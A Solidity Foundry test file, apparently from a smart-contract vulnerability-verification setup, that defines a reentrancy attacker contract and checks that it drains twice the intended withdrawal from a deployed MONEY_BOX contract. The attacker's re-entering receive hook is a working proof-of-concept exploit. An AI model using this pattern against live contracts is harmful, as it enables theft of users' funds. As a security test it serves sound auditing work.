// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol";

contract ReentrancyAttacker {
    MONEY_BOX public moneyBox;
    uint256 public attackAttempts = 0;

    constructor(MONEY_BOX _moneyBox) {
        moneyBox = _moneyBox;
    }

    function deposit() public payable {
        moneyBox.Put{value: msg.value}(0);
    }

    function attack(uint256 amount) public {
        moneyBox.Collect(amount);
    }

    receive() external payable {
        if (attackAttempts < 1) {
            attackAttempts++;
            moneyBox.Collect(moneyBox.MinSum());
        }
    }
}

contract MoneyBoxTest is Test {
    MONEY_BOX public moneyBox;
    Log public logContract;
    ReentrancyAttacker public attacker;
    uint256 public constant INITIAL_BALANCE = 1 ether;
    uint256 public constant WITHDRAW_AMOUNT = 0.1 ether;

    function setUp() public {
        logContract = new Log();
        moneyBox = new MONEY_BOX();
        moneyBox.SetMinSum(WITHDRAW_AMOUNT);
        moneyBox.SetLogFile(address(logContract));
        
        attacker = new ReentrancyAttacker(moneyBox);
        attacker.deposit{value: INITIAL_BALANCE}();
    }

    function testReentrancyVulnerability() public {
        console.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(moneyBox).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackAttemptsBefore = attacker.attackAttempts();

        console.log("Contract balance before attack:   %s", contractBalanceBefore);
        console.log("Attacker balance before attack:   %s", attackerBalanceBefore);
        console.log("Attack attempts before attack:    %s", attackAttemptsBefore);

        console.log("--- Trigger: Attack ---");
        // Trigger unlock condition
        vm.warp(block.timestamp + 1 days);
        
        // Trigger reentrancy attack
        attacker.attack(WITHDRAW_AMOUNT);

        console.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(moneyBox).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackAttemptsAfter = attacker.attackAttempts();

        console.log("Contract balance after attack:    %s", contractBalanceAfter);
        console.log("Attacker balance after attack:    %s", attackerBalanceAfter);
        console.log("Attack attempts after attack:     %s", attackAttemptsAfter);

        // Existing verifications
        assertEq(
            contractBalanceAfter,
            INITIAL_BALANCE - (2 * WITHDRAW_AMOUNT),
            "Contract balance mismatch after attack"
        );
        assertEq(
            attackerBalanceAfter,
            2 * WITHDRAW_AMOUNT,
            "Attacker balance mismatch after attack"
        );
        assertEq(
            attackAttemptsAfter,
            1,
            "Reentrancy should have been triggered once"
        );
        
        // Differential comparison for verdict
        bool vulnerabilityExists = 
            contractBalanceBefore - contractBalanceAfter == 2 * WITHDRAW_AMOUNT &&
            attackerBalanceAfter - attackerBalanceBefore == 2 * WITHDRAW_AMOUNT &&
            attackAttemptsAfter == attackAttemptsBefore + 1;
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained double the intended amount from the contract");
        } else {
            console.log("Vulnerability not Exist: No abnormal state changes indicative of reentrancy detected");
        }
    }
}